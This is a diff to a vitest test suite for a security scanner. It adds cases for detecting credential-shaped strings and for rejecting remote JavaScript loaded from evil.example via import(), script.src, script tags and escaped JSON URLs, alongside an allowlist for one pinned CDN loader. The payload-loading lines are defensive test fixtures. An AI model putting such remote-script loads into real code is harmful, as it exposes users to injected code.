@@ -1,9 +1,10 @@
 import { describe, expect, it } from 'vitest';
 
-import { scanText } from '../../scripts/lib/security-scanner.mjs';
+import { isScannableTextPath, scanText } from '../../scripts/lib/security-scanner.mjs';
 
 const credential = ['fixture', 'credential', '0123456789abcdef'].join('');
 const skCredential = ['s', 'k-', credential].join('');
+const base64Credential = ['YWJjZGVmZ2hpamtsbW5vcA', '+/=='].join('');
 
 describe('security scanner', () => {
   it.each([
@@ -13,6 +14,7 @@ describe('security scanner', () => {
     ['backtick value', `const token = \`${credential}\``],
     ['Bearer credential', `Authorization: Bearer ${credential}`],
     ['sk credential', `const credential = '${skCredential}'`],
+    ['base64 credential', `{"api_key":"${base64Credential}"}`],
   ])('detects a credential-shaped %s', (_kind, text) => {
     expect(scanText('tools/media/fixture.txt', text)).toContain('tools/media/fixture.txt: credential-shaped value');
   });
@@ -48,11 +50,21 @@ describe('security scanner', () => {
     );
   });
 
+  it('normalizes runtime path case and JSON-escaped generation URLs', () => {
+    const path = 'Src/runtime-client.ts';
+    const text = String.raw`{"endpoint":"https:\/\/provider.example\/v1\/images\/generations"}`;
+    expect(scanText(path, text)).toContain(`${path}: runtime generation API`);
+  });
+
   it.each([
     "import('https://evil.example/payload.js')",
     "import 'https://evil.example/payload.js'",
     "script.src = 'https://evil.example/payload.js'",
     '<script src="https://evil.example/payload.js"></script>',
+    "import('https://evil.example/extensionless')",
+    "import('https://evil.example/payload.mjs')",
+    "script.src = '//evil.example/payload.js'",
+    String.raw`{"loader":"https:\/\/evil.example\/payload.js"}`,
   ])('rejects arbitrary remote executable JavaScript: %s', (text) => {
     expect(scanText('card/fixture.json', text)).toContain('card/fixture.json: untrusted remote executable JavaScript');
   });
@@ -60,8 +72,18 @@ describe('security scanner', () => {
   it('allows only the exact immutable Albina loader and canonical asset URLs in runtime files', () => {
     const base = 'https://cdn.jsdelivr.net/gh/q18718859808-sketch/albina-galgame-card@v2.0.0/dist/albina-galgame-card';
     expect(scanText('card/albina.card.json', `script.src='${base}/source/albina-classic-loader.js'`)).toEqual([]);
+    expect(scanText('src/media.ts', `image.src='${base}/assets/cg/opening_rain.jpg'; audio.src='${base}/assets/audio/bgm/title.mp3'`)).toEqual([]);
     expect(scanText('dist/albina-galgame-card/manifest.json', `{"asset":"${base}/assets/cg/opening_rain.jpg"}`)).toEqual([]);
     expect(scanText('card/albina.card.json', "script.src='https://cdn.jsdelivr.net/npm/other/index.js'"))
       .toContain('card/albina.card.json: untrusted remote executable JavaScript');
+  });
+
+  it.each([
+    'src/runtime.cjs',
+    'src/runtime.jsx',
+    'src/policy.xml',
+    'src/Makefile',
+  ])('scans credential-capable text path %s', (path) => {
+    expect(isScannableTextPath(path)).toBe(true);
   });
 });
